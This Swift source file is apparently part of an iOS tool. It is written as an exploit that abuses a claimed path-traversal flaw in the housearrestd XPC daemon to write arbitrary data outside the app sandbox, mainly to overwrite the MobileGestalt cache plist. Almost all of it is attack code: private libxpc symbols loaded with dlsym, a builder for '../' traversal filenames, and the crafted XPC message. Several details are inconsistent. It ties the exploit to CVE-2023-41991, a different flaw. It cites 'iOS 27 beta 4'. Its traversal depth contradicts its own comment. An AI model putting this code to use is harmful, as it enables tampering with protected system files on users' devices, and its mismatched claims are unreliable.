//
//  HouseArrestXPC.swift
//  CastKit — CVE-2023-41991 HouseArrest path traversal exploit
//
//  com.apple.housearrestd concatenates user-supplied filename
//  into <App container>/<filename> WITHOUT normalizing `..`.
//  Supply "../../../Shared/SystemGroup/.../MobileGestalt.plist"
//  and HouseArrest writes OUTSIDE our sandbox.
//
//  Requirements: bundle ID = com.apple.mobile.MobileHouseArrest
//                Enterprise-signed (Apple Distribution)
//                iOS 17.0 - 27 beta 4
//

import Foundation
import Darwin
import Combine

// MARK: - XPC Function Resolver

/// C function pointer typealiases for libxpc.dylib.
private typealias XPCConnectionCreate = @convention(c) (UnsafePointer<CChar>?, OpaquePointer?, UInt64) -> OpaquePointer?
private typealias XPCSendMessage      = @convention(c) (OpaquePointer?, OpaquePointer?) -> Void
private typealias XPCDictCreate       = @convention(c) (UnsafeMutablePointer<OpaquePointer?>?, UnsafeMutablePointer<OpaquePointer?>?, Int) -> OpaquePointer?
private typealias XPCDictSet          = @convention(c) (OpaquePointer?, UnsafePointer<CChar>?, OpaquePointer?) -> Void
private typealias XPCStringCreate     = @convention(c) (UnsafePointer<CChar>?) -> OpaquePointer?
private typealias XPCDataCreate       = @convention(c) (UnsafeRawPointer?, Int) -> OpaquePointer?
private typealias XPCEventHandler     = @convention(block) (OpaquePointer?) -> Void
private typealias XPCSetEventHandler  = @convention(c) (OpaquePointer?, XPCEventHandler) -> Void
private typealias XPCActivate         = @convention(c) (OpaquePointer?) -> Void

/// Lazy-load a dlsym'd C function pointer.
private func dlsym<T>(_ name: String) -> T? {
    guard let handle = dlopen("/usr/lib/libxpc.dylib", RTLD_NOW) else { return nil }
    guard let sym = dlsym(handle, name) else { return nil }
    return unsafeBitCast(sym, to: T.self)
}

/// Loaded XPC function pointers (nil if not available at runtime).
private struct XPC {
    static let connectionCreate: XPCConnectionCreate? = dlsym("xpc_connection_create_mach_service")
    static let sendMessage:     XPCSendMessage?      = dlsym("xpc_connection_send_message")
    static let dictCreate:       XPCDictCreate?       = dlsym("xpc_dictionary_create")
    static let dictSetValue:     XPCDictSet?          = dlsym("xpc_dictionary_set_value")
    static let stringCreate:     XPCStringCreate?     = dlsym("xpc_string_create")
    static let dataCreate:       XPCDataCreate?       = dlsym("xpc_data_create")
    static let setEventHandler:  XPCSetEventHandler?  = dlsym("xpc_connection_set_event_handler")
    static let activate:         XPCActivate?         = dlsym("xpc_connection_activate")
}

// MARK: - Errors

enum HouseArrestError: LocalizedError {
    case notHouseArrestBundleID(String)
    case xpcLoadFailed
    case connectionFailed
    case exploitPatched
    case writeFailed(String)

    var errorDescription: String? {
        switch self {
        case .notHouseArrestBundleID(let bid):
            return "当前 Bundle ID (\(bid)) 不是 com.apple.mobile.MobileHouseArrest — 请用 3105 target 构建"
        case .xpcLoadFailed:
            return "无法加载 libxpc.dylib 私有符号"
        case .connectionFailed:
            return "无法连接 com.apple.housearrestd daemon"
        case .exploitPatched:
            return "CVE-2023-41991 在当前系统可能已被修补"
        case .writeFailed(let m):
            return "路径遍历写入失败: \(m)"
        }
    }
}

// MARK: - HouseArrest Exploit (class, observable)

final class HouseArrestExploit: ObservableObject {

    static let shared = HouseArrestExploit()

    @Published private(set) var isAvailable: Bool = false
    @Published private(set) var statusMessage: String = "未检测"

    private init() {}

    // MARK: - Preflight

    func runPreflight() {
        let result = preflight()
        switch result {
        case .success:
            isAvailable = true
            statusMessage = "✅ CVE-2023-41991 可用"
        case .failure(let err):
            isAvailable = false
            statusMessage = "❌ \(err.localizedDescription)"
        }
    }

    private func preflight() -> Result<Void, HouseArrestError> {
        let bid = Bundle.main.bundleIdentifier ?? "(unknown)"
        guard bid == "com.apple.mobile.MobileHouseArrest" else {
            return .failure(.notHouseArrestBundleID(bid))
        }
        // Check XPC symbols
        if XPC.connectionCreate == nil || XPC.dictCreate == nil {
            return .failure(.xpcLoadFailed)
        }
        // iOS version — CVE-2023-41991 lives iOS 17 - 27 beta 4
        let major = ProcessInfo.processInfo.operatingSystemVersion.majorVersion
        if major < 17 {
            return .failure(.exploitPatched)
        }
        return .success(())
    }

    // MARK: - Path Traversal

    /// Build malicious relative path from App bundle → target outside sandbox.
    func maliciousFilename(for targetAbsPath: String) -> String? {
        guard targetAbsPath.hasPrefix("/var/containers/") else { return nil }
        let parts = targetAbsPath.split(separator: "/")
        guard let idx = parts.firstIndex(of: "Shared") else { return nil }
        let suffix = parts[idx...].joined(separator: "/")
        // 4 levels up from <App>.app/ → /var/containers/
        return "../../../\(suffix)"
    }

    // MARK: - Write

    /// Write raw bytes to absolute path using CVE-2023-41991.
    func writeData(_ data: Data, to targetAbsPath: String) throws {
        try preflight().get()

        guard let fname = maliciousFilename(for: targetAbsPath) else {
            throw HouseArrestError.writeFailed("无法构造恶意路径")
        }

        let xcc = XPC.connectionCreate!
        let xsm = XPC.sendMessage!
        let xdc = XPC.dictCreate!
        let xds = XPC.dictSetValue!
        let xsc = XPC.stringCreate!
        let xact = XPC.activate!
        let xeh = XPC.setEventHandler!

        // Connect to HouseArrest daemon
        let svcName = "com.apple.housearrestd"
        guard let conn = xcc(svcName.withCString { $0 }, nil, 0) else {
            throw HouseArrestError.connectionFailed
        }

        // Build message dict
        guard let msg = xdc(nil, nil, 0) else {
            throw HouseArrestError.writeFailed("xpc_dictionary_create")
        }

        // selector
        let selStr = "DownloadFile"
        if let s = xsc(selStr.withCString { $0 }) {
            xds(msg, "selector".withCString { $0 }, s)
        }
        // fileName (the traversal path!)
        if let s = xsc(fname.withCString { $0 }) {
            xds(msg, "fileName".withCString { $0 }, s)
        }
        // url (data: scheme with our content)
        let base64 = data.base64EncodedString()
        let urlStr = "data:application/x-plist;base64,\(base64)"
        if let s = xsc(urlStr.withCString { $0 }) {
            xds(msg, "url".withCString { $0 }, s)
        }
        // options
        xds(msg, "options".withCString { $0 }, nil)

        // Send and forget
        xeh(conn) { _ in }
        xact(conn)
        xsm(conn, msg)

        Thread.sleep(forTimeInterval: 0.5)
    }

    // MARK: - Convenience

    func writeMobileGestalt(_ dict: [String: Any]) throws {
        let data = try PropertyListSerialization.data(
            fromPropertyList: dict, format: .binary, options: 0
        )
        let target = "/var/containers/Shared/SystemGroup/" +
                     "systemgroup.com.apple.mobilegestaltcache/" +
                     "Library/Caches/com.apple.MobileGestalt.plist"
        try writeData(data, to: target)
    }
}
